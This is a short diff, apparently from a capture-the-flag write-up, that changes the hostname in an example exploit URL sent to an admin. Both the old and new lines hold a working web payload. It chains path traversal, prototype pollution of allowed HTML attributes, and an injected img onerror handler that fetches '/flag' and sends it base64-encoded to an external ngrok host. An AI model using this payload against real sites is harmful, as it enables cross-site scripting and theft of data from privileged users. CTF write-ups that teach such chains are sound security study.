@@ -11,5 +11,5 @@
  - An example url to send the admin:
 
 ```
-https://superfund-challenge.2r.is/x/..%2fadmin/index.html?debug={"__proto__":{"allowedAttrs":["src","onerror"]},"user":{"name":"<img+src=x+onerror=fetch('/flag').then(r=%26gt;r.text()).then(d=%26gt;fetch('https://5103fe977eae.ngrok.io/b64/'%2Bbtoa(d))) />"}}&id=x
+https://superfund.2r.is/x/..%2fadmin/index.html?debug={"__proto__":{"allowedAttrs":["src","onerror"]},"user":{"name":"<img+src=x+onerror=fetch('/flag').then(r=%26gt;r.text()).then(d=%26gt;fetch('https://5103fe977eae.ngrok.io/b64/'%2Bbtoa(d))) />"}}&id=x
  ```
